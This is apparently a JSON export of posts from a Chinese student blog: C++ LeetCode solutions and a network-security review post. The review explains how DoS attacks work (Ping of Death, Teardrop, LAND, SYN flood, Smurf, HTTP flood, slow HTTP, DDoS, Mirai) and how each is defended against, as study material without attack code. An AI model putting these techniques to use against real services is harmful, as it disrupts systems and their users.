我最开始的想法，双堆对顶又是什么呢？这是一种同时使用小根堆和大根堆来维护整个数组的办法，小根堆larger中的所有元素都比堆顶元素更大，大根堆smaller中的所有元素都比堆顶元素小。这样，任何时刻，数组中的数据被组织如下：\n\r双堆对顶\r\n这种办法可以用于快速求解数据流的中位数，是个困难题，我还没做。根据中位数的定义，中间部分的数据正需要满足比左边都大，比右边都小的性质，使用双堆对顶的办法可以在 O(1) 的时间内找到数据流中的中位数。\n这题使用双堆对顶是杀鸡用了牛刀了。将小于第K大数的数据保存在smaller堆中并没有什么意义，只是空耗时间罢了。\n而且，这种办法在额外考虑初始数组为空的情况、以及初始数组的大小小于K的情况时比较繁琐，我在这里WA了两次:cry:\n AC代码1 class KthLargest { public: priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, greater\u0026lt;int\u0026gt;\u0026gt; larger; priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, less\u0026lt;int\u0026gt;\u0026gt; smaller; bool larger_not_full = true; // larger是个小顶堆，堆顶元素是最小的  // smaller是个大顶堆，堆顶元素是最大的  // 第K大数，表示有K - 1个数比他更大  // 有len - K个数比他更小  // e.g 4,5,8,2中的第三大数  // 有两个比他小，有一个比他大  // 我们以larger.top()为第K大数，则smaller里面始终保持len - K个元素  KthLargest(int k, vector\u0026lt;int\u0026gt;\u0026amp; nums) { if (nums.size() == 0) nums.push_back(-100000); // 放入一个极小值，对第K大数无影响  for (auto t : nums) { larger.push(t); } if (nums.size() \u0026gt;= k) { for (int i = 0; i \u0026lt; nums.size() - k; i++) { smaller.push(larger.top()); larger.pop(); } larger_not_full = false; } // larger里的所有元素都大于堆顶  // 故保持larger个数为K个，即可从堆顶中获取第K大数  // cout \u0026lt;\u0026lt; \u0026#34;Original \u0026#34; \u0026lt;\u0026lt; k \u0026lt;\u0026lt; \u0026#34;th. largest is \u0026#34; \u0026lt;\u0026lt; larger.top() \u0026lt;\u0026lt; endl;  } int add(int val) { int res; if (larger_not_full) { larger.push(val); res = larger.top(); larger_not_full = false; } else { if (val \u0026gt;= larger.top()) // 比第K大数还大，第K大数可能改变  { smaller.push(larger.top()); larger.pop(); larger.push(val); // cout \u0026lt;\u0026lt; larger.top() \u0026lt;\u0026lt; endl;  res = larger.top(); } else // 插入了一个更小的数，不会改变第K大数  { smaller.push(val); // cout \u0026lt;\u0026lt; larger.top() \u0026lt;\u0026lt; endl;  res = larger.top(); } } return res; } }; /** * Your KthLargest object will be instantiated and called as such: * KthLargest* obj = new KthLargest(k, nums); * int param_1 = obj-\u0026gt;add(val); */ AC代码2 class KthLargest { public: priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, greater\u0026lt;int\u0026gt;\u0026gt; larger; int K; KthLargest(int k, vector\u0026lt;int\u0026gt;\u0026amp; nums) { K = k; for (auto t : nums) { larger.push(t); } while (larger.size() \u0026gt; k) { larger.pop(); } // larger里的所有元素都大于堆顶  // 故保持larger个数为K个，即可从堆顶中获取第K大数  // cout \u0026lt;\u0026lt; \u0026#34;Original \u0026#34; \u0026lt;\u0026lt; k \u0026lt;\u0026lt; \u0026#34;th. largest is \u0026#34; \u0026lt;\u0026lt; larger.top() \u0026lt;\u0026lt; endl;  } int add(int val) { int res; if (larger.size() \u0026lt; K) { larger.push(val); res = larger.top(); } else { if (val \u0026gt;= larger.top()) // 比第K大数还大，第K大数可能改变  { larger.push(val); larger.pop(); res = larger.top(); } else // 插入了一个更小的数，不会改变第K大数  { res = larger.top(); } } return res; } }; /** * Your KthLargest object will be instantiated and called as such: * KthLargest* obj = new KthLargest(k, nums); * int param_1 = obj-\u0026gt;add(val); */ 优化掉smaller堆之后，表现会好一些。\n\rPerformance-Final\r\n参考资料 [1] 力扣官方题解.数据流中的第K大元素[EB/OL].2021-02-11\nhttps://leetcode-cn.com/problems/kth-largest-element-in-a-stream/solution/shu-ju-liu-zhong-de-di-k-da-yuan-su-by-l-woz8/\n","date":"2021-02-11T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode703.-%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E7%AC%AC-k-%E5%A4%A7%E5%85%83%E7%B4%A0/","title":"错题本 | LeetCode703. 数据流中的第 K 大元素"},{"content":"题目链接：https://leetcode-cn.com/problems/subarrays-with-k-different-integers/\n思路是真难想，想出来之后是真简单。\n已经是我目前的水平无法搞定的程度了，在此稍作记录。\n题目  给定一个正整数数组 A，如果 A 的某个子数组中不同整数的个数恰好为 K，则称 A 的这个连续、不一定独立的子数组为好子数组。\n（例如，[1,2,3,1,2] 中有 3 个不同的整数：1，2，以及 3。）\n返回 A 中好子数组的数目。\n示例1\n  输入： A = [1,2,1,2,3], K = 2\n  输出： 7\n  解释： 恰好由 2 个不同整数组成的子数组：[1,2], [2,1], [1,2], [2,3], [1,2,1], [2,1,2], [1,2,1,2].\n  示例2\n  输入： A = [1,2,1,3,4], K = 3\n  输出： 3\n  解释： 恰好由 3 个不同整数组成的子数组：[1,2,1,3], [2,1,3], [1,3,4].\n  数据范围\n 1 \u0026lt;= A.length \u0026lt;= 20000 1 \u0026lt;= A[i] \u0026lt;= A.length 1 \u0026lt;= K \u0026lt;= A.length   分析  这个月是滑动窗口月啊，这题也想着滑动窗口，但是没有以前的题目那么直白了。\n我们可以看看滑动窗口常用的场景——“最值”问题：\n 76. 最小覆盖子串； 209. 长度最小的子数组； 159. 至多包含两个不同字符的最长子串； 424. 替换后的最长重复字符。  在这道题中，我们要把“恰好”转换成为“最多”。使用最多包含K个不同整数的子区间个数减掉最多包含K - 1个不同整数的子区间个数，正是所要求的恰好包含K个不同整数的子区间个数。\n为什么能想到这样的思路呢？无他，唯手熟尔。\n  如何使用滑动窗口求解最多包含K个不同整数的子区间个数呢？我们使用两个指针left和right来标识一个左闭右闭区间，每当一个窗口满足其内的元素小于等于K个时，这个窗口将会贡献right - left + 1个子数组。当一个窗口内的元素大于K个时，我们移动左指针，使得窗口内的元素再次小于等于K个，然后再考虑它的贡献。\n为什么一个窗口能贡献这么多的子数组呢？以及这种方法的正确性在哪里呢？\n以示例1为例，数组[1,2,1,2,3], K = 2，我们考虑元素个数小于等于2的所有子数组。\n当left = right = 0时，窗口内不同元素个数小于等于2，贡献了一个子数组。\n当left = 0, right = 1时，窗口内不同元素个数等于2，贡献了两个子数组。\n\u0026hellip;\u0026hellip;\n我们特别地考虑left = 0, right = 3的情况，窗口内不同元素的个数还是2，我们看看它到底是不是贡献了3 - 2 + 1 = 4个子数组。\n\r4个满足条件的子数组\r\n是的，我们从right向左延伸，包括right所指的元素本身在内，一共能找到right - left + 1 = 4个子数组。\n注意是从right向左延伸，因为右边界小于right的子数组一定在更早的循环被考虑过了。比如图中的中间子数组[2, 1]，在我们的right = 2时已经考虑过它。\n因此，能够写出至多包含K个子元素的滑动窗口代码：\nint subarrayWithMostKDistinct(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { int len = A.size(); if (len == 1) return 1; int freq[200001] = { 0 }; int left = 0; int right = 0; int cnt = 0; int res = 0; while (right \u0026lt; len) { freq[A[right]]++; // 加入  if (freq[A[right]] == 1) // 新的元素  { cnt++; } while (cnt \u0026gt; K) // 已经不满足条件  { freq[A[left]]--; if (freq[A[left]] == 0) cnt--; left++; } res += (right - left + 1); right++; } return res; }  AC代码 class Solution { public: int subarrayWithMostKDistinct(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { /* 最多包含K个不同元素的子数组个数 ` ` */ int len = A.size(); if (len == 1) return 1; int freq[200001] = { 0 }; int left = 0; int right = 0; int cnt = 0; int res = 0; while (right \u0026lt; len) { freq[A[right]]++; // 加入  if (freq[A[right]] == 1) // 新的元素  { cnt++; } while (cnt \u0026gt; K) // 已经不满足条件  { freq[A[left]]--; if (freq[A[left]] == 0) cnt--; left++; } res += (right - left + 1); right++; } return res; } int subarraysWithKDistinct(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { return subarrayWithMostKDistinct(A, K) - subarrayWithMostKDistinct(A, K - 1); } }; 表现效果莫名其妙:smirk:\n\rPerformance\r\n 人一能之，己百之；人十能之，己千之。果能此道矣，虽愚必明，虽柔必强。\n 参考资料 [1] 力扣（LeetCode）.K个不同整数的子数组[EB/OL].2021-02-08\nhttps://leetcode-cn.com/problems/subarrays-with-k-different-integers/solution/k-ge-bu-tong-zheng-shu-de-zi-shu-zu-by-l-ud34/\n","date":"2021-02-09T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode992.-k-%E4%B8%AA%E4%B8%8D%E5%90%8C%E6%95%B4%E6%95%B0%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/","title":"难题本 | LeetCode992. K 个不同整数的子数组"},{"content":"题目链接：https://leetcode-cn.com/problems/non-decreasing-array/\n看到这题第一感受：简单题！\n做完这题第一感受：简单题？\n题目  给你一个长度为 n 的整数数组，请你判断在 最多 改变 1 个元素的情况下，该数组能否变成一个非递减数列。\n我们是这样定义一个非递减数列的： 对于数组中所有的 i (0 \u0026lt;= i \u0026lt;= n-2)，总满足 nums[i] \u0026lt;= nums[i + 1]。\n示例1\n  输入： nums = [4,2,3]\n  输出： true\n  解释： 你可以通过把第一个4变成1来使得它成为一个非递减数列。\n  示例2\n  输入： nums = [4,2,1]\n  输出： false\n  数据范围\n 1 \u0026lt;= n \u0026lt;= 10 ^ 4 - 10 ^ 5 \u0026lt;= nums[i] \u0026lt;= 10 ^ 5   分析  简单题毕竟还是简单题，思路初步找起来是比较容易的。\n我们把所有元素以(index, value)这种形式在坐标轴上画出来，横坐标是元素下标，纵坐标是元素数值，那么如果希望该数组是一个非递减数列，这张折线图的形状最终需要满足各个部位的斜率都大于等于0。\n如果在允许改变一个元素的情况下，希望该数组变为一个非递减数列，那么初始图形只允许有一个波谷存在，而且这个波谷还必须具备某些性质。\n例如，对于一组数据3,5,6,7,8,3,10，可以改变倒数第二个元素3，令其等于8，即可构成一个非递减数列。\n这组数据原本的折线图是这样的：\n\rFig 1.\r\n改变一个元素后的折线图是这样的：\n\rFig 2.\r\n下面给出原始折线图需要满足的两个性质：\n  对于原始的折线图，首先只允许有一个波谷存在，如果超过一个波谷，说明存在有两处的非递减情况，这时只改变一个元素是不行的。\n  对于这一处波谷，还有几种情况：\n  波谷左边的元素小于等于波谷右边。也就是Fig1的情况，我们可以直接令波谷元素等于波谷左边的元素，这样就填平了波谷，并且保持继续上涨的趋势不变；如果波谷右边已经没有元素，说明已经到达了最后，直接将波谷元素拔高即可；\n  波谷左边的元素大于波谷右边。此时我们就不能将波谷拔高到其左边的元素了，只能将其左边的元素拉低到波谷。这种情况下，我们要考虑到波谷左边第二个元素，如果它也大于波谷，这时就不存在一种办法来填平波谷。\n我们先看看可以填平波谷的情况：\n\rFig 3.\r\n可以看到，波谷左边第二个元素小于波谷，那么我们将波谷左边的元素拉低到波谷的水平，就能把波谷消除掉：\n\rFig 4.\r\n当波谷左边第二个元素大于波谷，我们把波谷左边的元素拉低到波谷时，产生了新的波谷：\n\r波谷左边第二个元素大于波谷\r\n\r产生新的波谷\r\n特别地，当波谷左边只有一个元素，自然就直接将左边的元素拉低即可。示例1中的nums = [4,2,3]就属于这种情况。\n     AC代码  下标从前往后递增，每次判断是否出现一个下降的区段。\n首先，全局范围内只能出现一次下降；\n其次，这个波谷要分上面两种情况讨论。\n class Solution { public: bool checkPossibility(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int len = nums.size(); if (len == 1) { return true; } int ptr; int change = 0; // 改变的元素个数  bool res = true; ptr = 1; while (ptr \u0026lt; len) { if (nums[ptr] \u0026lt; nums[ptr - 1]) // 递减了  { if (change \u0026lt; 1) { // 波谷左边的元素大于波谷右边，只能拉低左边元素，不能拔高波谷  if (ptr + 1 \u0026lt; len \u0026amp;\u0026amp; nums[ptr - 1] \u0026gt; nums[ptr + 1]) { // 只能改变nums[ptr - 1]  if ((ptr - 2 \u0026gt;= 0 \u0026amp;\u0026amp; nums[ptr - 2] \u0026lt;= nums[ptr]) || ptr == 1) { nums[ptr - 1] = nums[ptr]; change++; continue; } else { // nums[ptr - 2] \u0026gt; nums[ptr]  res = false; break; } } else // 波谷左边元素小于等于波谷右边元素，直接拔高波谷  { nums[ptr] = nums[ptr - 1]; change++; continue; } } else { res = false; break; } } ptr++; } return res; } }; 表现很一般，就不放出来了。比较复杂的逻辑增大了时间消耗，暂时没有看到有什么优化的办法。\n","date":"2021-02-07T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode665.-%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/","title":"难题本 | LeetCode665. 非递减数列"},{"content":"网络安全理论复习开始了！\n今天从最简单的开始，目标是在寒假期间整理完成《网络安全》这门课所涉及的知识。希望本系列文章能以清晰的思路将安全理论表述出来。\nDoS Denial of Service，拒绝服务，是现代网络安全领域很常见的一种攻击。所谓拒绝服务，就是通过一系列手段使得原本正常运行的服务器无法再为用户的请求提供服务与应答，从而使目标业务停滞。\n我们经常能看到拒绝服务的例子：使用”呼死你“软件不断地拨打某人的电话，则其他人正常呼叫的时候他永远是占线的状态；网络”水军“控评，正常的评论和留言就无法被看到；黄牛使用恶意的抢票软件抢占所有电影票，使得正常渠道无法获得``````\n在计算机网络的世界中，拒绝服务攻击可以是非常粗暴的物理攻击：砸毁服务器、切断网线等；更为常见且稍微有点技术含量的是利用计算机本身的漏洞，构造恶意的网络请求来使目标系统崩溃、主机宕机、重启等。\n下面介绍一些常见的DoS攻击手法。\nPing of Death Ping of Death（死亡之Ping）的原理是构造一个超大的IP包来使目标主机瘫痪。在详细解释这个手法之前，需要从ICMP协议入手，介绍Ping的基本知识。\nICMP 网际控制报文协议（ICMP）用于让主机或路由器报告差错和异常情况。ICMP报文包含在IP数据报中，作为IP数据报的数据部分，加上IP首部发送出去，因此，ICMP是一个网络层协议。\nICMP报文的种类有两种，ICMP差错报告报文和ICMP询问报文。\nICMP差错报告报文用于目标主机或到目标主机路径上的路由器向源主机报告差错和异常情况，共有5种类型：\n 终点不可达。 源点抑制。由于拥塞而丢弃数据报时，要求源主机减小发送速率。 时间超过。 参数问题。路由器或目的主机收到的数据报首部中有的字段不正确。 改变路由（重定向）。路由器把重定向信息发给主机，下一次使用更好的路由。  ICMP询问报文有4种类型：\n 回送请求和应答。主机向目标发送ICMP请求，如果途中没有异常，则目标收到消息后恢复ICMP响应、 时间戳请求和应答。测试来回一次的传输时间。主机填充原始时间戳，接收方受到后填充时间戳返回。 掩码地址请求和回答。 路由器询问和通告。  PING PING工作在应用层。它直接使用网络层的ICMP询问报文，而未使用传输层的TCP或UDP。如果一台主机能PING通另一台主机，证明至少存在着一条可用的物理通路。\nPing of Death 死亡之Ping攻击利用了计算机实现IP协议时存在的缺陷。早期操作系统处理IP分组时，只开辟了64KB的缓冲区用来存放收到的数据包。如果攻击者故意在ICMP Echo（即PING数据报）之后附加非常多的冗余信息，使最终的IP包的大小超过65535字节的上限，接收方在处理这么大的IP包时就会产生内存分配错误，引起系统崩溃、挂起或重启。\n可以看到这种攻击的实现主要是由于IP协议栈的漏洞，那为什么叫做死亡之Ping呢？因为使用PING工具太容易完成这种攻击，以至于它也成为了这种攻击的首选武器。当然，除了PING之外的任何能够构造超大IP包的程序都能实现这个攻击。\nPing of Death攻击不好预防，因为IP存在分组机制，每个IP包看起来都非常正常。最好的办法是在系统实现层面进行完善，使内核不再对超过规定长度的包进行重组。\nTearDrop 又是IP协议实现的问题。故事从IP分片讲起。\n分片 我们知道，数据链路层的每个数据报能够承载的数据量是有上限的，这个上限称为最大传送单元（MTU）。因为IP数据报被封装在数据链路层的数据报中，因此链路层的MTU严格地限制着IP数据报的长度。IP包传送的路径上，有许许多多的链路，可能使用不同的链路层协议，而同时也可能有大小不一的MTU。当IP数据报的总长度大于链路MTU时，需要能够将IP数据报中的数据分装在两个或多个较小的IP数据报中，然后再作为链路层数据进行传送。这些较小的数据报称为片。\n片在目的地网络层被重新组装。对于一大堆杂乱无章的片，我们如何正确地重装成一个个独立的IP数据报呢？\nIP协议使用首部的标识、标志和片偏移字段来完成对片的重组。我们看看IP数据报的首部：\n\rIP Header\r\n第二行的标识字段占16位。它是一个计数器，每产生一个数据报就加一。分片时每个数据报片都复制一次标识号，以便能正确重装成原来的数据报。\n标志位有3比特。实际上只有后面2个比特有意义。它们分别是：\n MF位（More Fragment）。当MF = 1时，表示这个数据报后面还有后续的片；当MF = 0时表示这是最后一个片。 DF位（Don\u0026rsquo;t Fragment）。只有DF = 0时才允许将一个数据报分片。若DF = 1且数据报大小大于链路层的MTU，只能丢弃并发送ICMP错误信息。  片偏移占13位。既然一个数据报能被分成好几个小片，那么每个小片需要记录自己在原始数据报中的位置，否则怎么重组呢？片偏移的单位是8B，也就意味着除了最后一个片外，每个片中的有效载荷都是8的倍数（字节）。\nTeardrop 该攻击的原理是向目标主机发送一些分片的IP报文，并故意将片偏移字段设置成错误的值（与上一片重叠或错开）。某些操作系统在处理这类分片的时候会出现系统崩溃、重启等现象。\n这里主要以重叠为例。重叠是指第二片IP包的偏移量小于第一片的尾部，且算上第二片的长度也没有超过第一片的尾部。我认为更加准确的描述应该是IP分片的镶嵌，如下所示：\n\r分片重叠（镶嵌）\r\n这时，我们要求第二个分片的长度，如果使用len2 = end2 - end1来计算，就产生了一个负值。\n如果进一步使用memcpy(ip_package_start_addr + offset2, buffer, len2)来将第二个分片从缓冲区拷贝到重组IP包中，由于长度是一个负值，也就相当于一个unsigned的超大正值，就产生了溢出。\n 就我个人来说，其实还没有想清楚为什么要使用end2 - end1的办法来计算len2，明明长度字段就写在报头\u0026hellip;\n不过如果报头的长度字段也被伪造了，怎么办呢？Teardrop的防御办法是将接受到的数据报先缓存起来，然后先根据标识分组来进行检查，对于分片信息有错误的报文就直接丢弃。\n不过，还是简单一点，没有什么是一个补丁无法解决的，如果有，那就两个。:triumph:\n LAND攻击 在TCP连接管理中，源地址、目的地址、源端口、目的端口是最为重要的几个参数。如果交由你来实现TCP连接监听，是否会向一个SYN包中的源IP直接发起ACK应答呢？\nLAND攻击采用了特别构造的SYN包，其源地址和目的地址都被设置为目标服务器的地址。此举将导致接受服务器向它自己的地址发送一个SYN-ACK消息（第二次握手），然后再返回一次ACK消息（第三次握手），创建一个回环的空连接并保留下来，直到超时。\n现在，大多数防火墙都能拦截类似的攻击包以保护系统。部分操作系统也通过安全补丁修复了这一漏洞。此外，路由器应同时配置上行和下行筛选器，屏蔽所有源地址与目的地址相同的数据包。\nSYN FLOOD 还是SYN！\n在TCP连接管理中，建立连接需要三次握手，如果你对此不太熟悉，可以看看我对TCP知识点的整理。\nTCP连接的第二次握手，即服务器收到一个SYN包之后，如果同意连接，便返回一个SYN-ACK应答，并在此步分配TCP连接资源（如在内存中开辟缓冲区等）。\n而此时客户机还没有完成第三次握手，客户机资源还没有分配，故此时的连接称为半开连接。\n这种半开连接的数量是有限制的（废话），当服务器的连接资源被耗尽后，就不能再接受其他的TCP连接请求了。\n所以，猥琐的Attackers在短时间内构造大量的SYN包，但就是不完成第三次握手，使得客户机资源几乎没有受到影响，但服务器资源被快速耗尽，造成拒绝服务的效果。\n受到SYN FLOOD影响的系统有很多！这主要是由于这种攻击的几个细节：\n 连接请求是正常的（所以不好防），但是源IP地址往往是伪造的，并且是一台不可达的机器，否则被伪造的机器会重置这些半开连接； 半开连接也是有超时限制的，所以发送SYN包的速度要远大于服务器清除半开连接的速度； 任何连接到Internet上并提供基于TCP的网络服务，都能成为攻击目标； 这种攻击很难追踪！因为源地址往往不可信且不在线。  对于SYN FLOOD的防御，最常见的就是使用一个代理来接收TCP请求。这类代理可以通过真实客户端和伪造客户端的行为差异来对连接进行清洗，且由于代理的工作是单一的，能够进行硬件和操作系统TCP/IP协议栈的特别优化，或者开辟巨大的半开连接队列，具有较好的韧性。采用一系列策略（如Cookie源认证、reset认证，见参考资料8）确定对方连接的可用性之后，可以将源IP加入白名单，使其之后可以直连服务器；或者由代理向服务器发起连接，进行数据转发。\n此外，在主机层面可以延缓TCP连接资源的分配。如SYN Cache技术：先完成第二次握手，但是并不立即分配资源，而是在一个专用Cache中保存这个半开连接的信息，直到收到正确的ACK再分配资源。\nSmurf Smurf攻击是一种病毒攻击，以最初发动这种攻击的程序“Smurf”来命名。这种攻击方法结合使用了IP欺骗和ICMP回复的办法，使得大量流量涌向目标网络或系统，造成拒绝服务的效果。\n攻击者向一个具有大量主机和因特网连接的广播地址发送ICMP Echo请求，并用受害者的IP作为源地址；广播上的每台机器响应这些Echo请求，同时向受害者发送ICMP Echo-Reply应答；受害主机会被这些大量的应答包淹没。\n\rSmurf\r\n这种攻击已经很少见，大多数的网络已经对这种攻击免疫了。挫败一个Smurf攻击的最简单的方法就让路由器在收到向一个广播地址的ICMP Echo信息时丢弃它。\nHTTP Flood 常见的服务器在处理对某些URI的访问时需要消耗计算资源或系统资源，如果攻击者通过代理或僵尸主机向目标URI进行大量HTTP请求，将造成服务器资源的耗尽。以最典型的HTTP GET请求为例，针对服务器上某个文件进行快速的反复的读取，能造成服务器资源的减少；除了Web服务器之外，大量的HTTP请求可能产生大量的数据库查询，可以在几秒内使数据库停止响应。\n你应该会对这类攻击产生一种熟悉感，HTTP FLOOD和SYN FLOOD不是有点相似么？是的，其防御手段也相去不远。\nSYN FLOOD可以借助TCP代理来管理连接，而HTTP FLOOD也可以借助HTTP代理来解析HTTP请求。TCP代理通过Cookie源认证、reset认证等手段来甄别恶意程序和正常客户端，而HTTP的代理可以利用重定向、验证码等手段来甄别僵尸主机和正常客户端；除此之外，当目的IP流量触发警告阈值时，这样的代理可以对HTTP的源IP流量进行统计，对某个异常源流量进行限速；此外，代理还能监控源IP对某个URI的访问，当某个源主机短时间集中访问计算资源多的URL时，可以将其加入动态黑名单。\nHTTP 慢速攻击 2012年的OWASP大会上，由Wong Onn Chee和Tom Brennan共同演示。\n该攻击的基本原理是对HTTP服务器建立一个连接，指定一个比较大的content-length，然后以非常低的速度发包，维持住这个连接不断开。\n显然，如果客户端不断地建立这种连接，服务器的可用连接资源会被逐渐占满，导致拒绝服务。而在客户端使用单线程方式建立较大数量的无用连接的代价非常低廉，使得这类攻击的成本也较低。\nHTTP慢速攻击主要根据HTTP协议的内容分成三类：\n Slow Headers。Web应用在处理HTTP请求之前要先接收完所有的HTTP头部，因为头部中包含了一些可能用到的重要信息。攻击者利用这点建立HTTP连接，保持慢速发送HTTP头部，且一直不发送头部终止符（两个连续的\\r\\n），这样服务器就认为对方的头部还没有发完，一直维持连接，占用资源。 Slow Body。攻击者发送一个HTTP Post请求，该请求的content-length很大，使得服务器误以为对方要发送很大的数据。但是客户端每次只发少量数据，使该连接一直保活。 Slow Read。客户端与服务器建立连接并发送一个HTTP请求，客户端发送完整的请求给服务端，收到回应后一直保持这个连接，以很低的速度读取Response。比如客户端很长一段时间不读取任何数据，通过发送Zero Window到服务器，让服务器误以为客户端很忙，直到连接快超时之前才读取一个字节，以消耗服务器的连接资源。  防御此类攻击的最简单办法就是设置一个超时时间和最小速率。如果客户端不能在配置时间发送完头部或body数据，服务器会返回一个408 REQUEST_TIME_OUT错误；如果客户端不能在指定时间内接受完数据，也会引发超时。\n这样的防御措施实际上在网络条件不好的情况下会误伤正常用户，比如从中国大陆下载国外服务器上的大文件时，可能引发超时。\nDDoS 分布式拒绝服务攻击（Distributed Denial of Service），是DoS攻击的改进版本。传统的DoS攻击是一对一的攻击，这在算力飞涨的今天已经效果较差了。\n所谓分布式，就是控制大量的主机同时发动DoS攻击（如SYN FLOOD），规模越大，则流量成倍地上升，效果非常强悍。\nCC攻击（Challenge Collapsar） CC攻击的原理就是攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。这类攻击具有真实性高、检测困难、防御困难的特点。\n在物联网快速发展的时代，物联网设备的安全却刚刚起步。许多IoT设备使用默认密码，且被控制之后往往没有任何症状，这使得IoT设备成为了发动DDoS攻击的理想肉鸡。世界上最大的僵尸网络Mirai就包含大量的物联网设备，它们曾发起大规模的分布式拒绝服务攻击，导致美国东海岸大面积断网。\n 篇幅有限，对于DoS的检测就不详细展开了。目前，常见的DoS检测是基于异常的检测，即通过监视审计系统记录系统上的异常情况。比如当日志记录到某一时段爆发大量的流量，超出了平时的统计阈值时，可能表示此时段系统受到了DoS攻击。\n参考资料 [1] 百度百科.ping（网络诊断工具）[EB/OL]\nhttps://baike.baidu.com/item/ping/6235\n[2] 百度百科.ICMP[EB/OL]\nhttps://baike.baidu.com/item/ICMP/572452\n[3] 百度百科.Ping of Death[EB/OL]\nhttps://baike.baidu.com/item/Ping%20of%20Death\n[4] 小白教程.死亡之ping的工作原理以及如何预防[EB/OL]\nhttps://www.schoolw3c.com/ping-of-death/\n[5] 王道论坛.2021年计算机网络考研复习指导[M].北京:电子工业出版社,2020:147-157\n[6] 孤君.IP首部[EB/OL].2019-03-17\nhttps://blog.csdn.net/Wu000999/article/details/88617237\n[7] 快快网络.什么是Teardrop攻击？我们要如何防御Teardrop攻击？[EB/OL].2019-03-13\nhttps://www.jianshu.com/p/3ac57cfb3743\n[8] 一只IT小小鸟.DDoS攻击\u0026ndash;Syn_Flood攻击防护详解（TCP）[EB/OL].2018-08-22\nhttps://blog.csdn.net/qq_34777600/article/details/81946514\n[9] Java.Sheng.SYN Flood原理及防护[EB/OL].2016-04-16\nhttps://blog.csdn.net/woaigaolaoshi/article/details/51166340\n[10] 百度百科.land攻击[EB/OL]\nhttps://baike.baidu.com/item/land%E6%94%BB%E5%87%BB/4759470?fr=aladdin\n[11] 百度百科.Smurf攻击[EB/OL]\nhttps://baike.baidu.com/item/Smurf%E6%94%BB%E5%87%BB/9112141?fr=aladdin\n[12] fcm.HTTP Flood攻击与防御原理[EB/OL].2015-10-19\nhttps://forum.huawei.com/enterprise/zh/thread-293931.html\n[13] 中国网科技.Mirai僵尸网络再作乱 360：物联网设备成隐私泄露重灾区[EB/OL].2020-12-07\nhttp://tech.china.com.cn/roll/20201207/372546.shtml\n[14] wpjamer.CC攻击原理及防范方法[EB/OL].2018-05-12\nhttps://www.cnblogs.com/wpjamer/p/9030259.html\n","date":"2021-02-02T00:00:00Z","permalink":"https://xrg.fj.cn/p/dos%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/","title":"DoS——拒绝服务攻击"},{"content":"美好的二月从WA一道简单题开始。\n题目链接：https://leetcode-cn.com/problems/fair-candy-swap/\n 描述\n爱丽丝和鲍勃有不同大小的糖果棒：A[i] 是爱丽丝拥有的第 i 根糖果棒的大小，B[j] 是鲍勃拥有的第 j 根糖果棒的大小。\n因为他们是朋友，所以他们想交换一根糖果棒，这样交换后，他们都有相同的糖果总量。（一个人拥有的糖果总量是他们拥有的糖果棒大小的总和。）\n返回一个整数数组 ans，其中 ans[0] 是爱丽丝必须交换的糖果棒的大小，ans[1] 是 Bob 必须交换的糖果棒的大小。\n如果有多个答案，你可以返回其中任何一个。保证答案存在。\n示例1\n  输入： A = [1,1], B = [2,2]\n  输出：[1,2]\n  示例2\n  输入： A = [1,2], B = [2,3]\n  输出：[1,2]\n  数据范围\n 1 \u0026lt;= A.length \u0026lt;= 10000 1 \u0026lt;= B.length \u0026lt;= 10000 1 \u0026lt;= A[i] \u0026lt;= 100000 1 \u0026lt;= B[i] \u0026lt;= 100000 保证爱丽丝与鲍勃的糖果总量不同。 答案肯定存在。   分析 希望满足交换后的总和相等，不难看出交换的数量需要满足一定的关系。\n我们设Allice拿来交换的大小是changeA，Bob拿来交换的大小是changeB；两人交换前分别具有sumA和sumB总量的糖果，则两人交换之后拥有的总量分别是：\n Allice：sumA - changeA + changeB Bob：sumB - changeB + changeA  两个式子是相等的，那么我们进行相减，得到sumA - sumB + 2changeB - 2changeA = 0；\n进一步使用diff来表示sumA - sumB，即初始总量之差，则对等式变形能得到：changeA = changeB + diff / 2。\n这就是我们最终使用的公式，changeA和changeB满足的关系。\n暴力 我们可以循环Allice的每一个糖果棒，即对于每一个changeA，只需要使用公式计算changeB，然后判断changeB是否存在于Bob的集合中；当我们找到了一对changeA和changeB同时存在，就是最终的答案。\n则转化成为一个搜索问题，对于一个特定的changeB，在Bob的集合中查找它是否存在。\n使用顺序搜索，一层循环changeA，每个changeA还需要遍历一次Bob的集合，复杂度是O(n^2)，显然不行；\n使用二分搜索，一层循环changeA，每个changeA搜索对应的changeB只需要花费logn，则总复杂度是O(nlogn)，可以一试。\n第一次WA，二分写错了\u0026hellip;\n暴力二分，AC代码： class Solution { public: typedef long long LL; const int INF = 0xffffff; int bSearch(int target, vector\u0026lt;int\u0026gt; v) { int left = 0; int right = v.size() - 1; int res = -INF; while (left \u0026lt;= right) { int mid = (left + right) / 2; if (v[mid] \u0026lt; target) // 答案在右半部分  { left = mid + 1; continue; } else if (v[mid] \u0026gt; target) // 答案在左半部分  { right = mid - 1; continue; } else { res = target; break; } } return res; // 没找到，-INF；找到，target  } vector\u0026lt;int\u0026gt; fairCandySwap(vector\u0026lt;int\u0026gt;\u0026amp; A, vector\u0026lt;int\u0026gt;\u0026amp; B) { sort(A.begin(), A.end()); sort(B.begin(), B.end()); LL sum_a = 0; LL sum_b = 0; for (int i = 0; i \u0026lt; A.size(); ++i) sum_a += A[i]; for (int i = 0; i \u0026lt; B.size(); ++i) sum_b += B[i]; LL diff = sum_a - sum_b; int change_a, change_b; // change_a = change_b + diff / 2  vector\u0026lt;int\u0026gt; res; for (int i = 0; i \u0026lt; A.size(); ++i) { change_a = A[i]; change_b = change_a - diff / 2; // cout 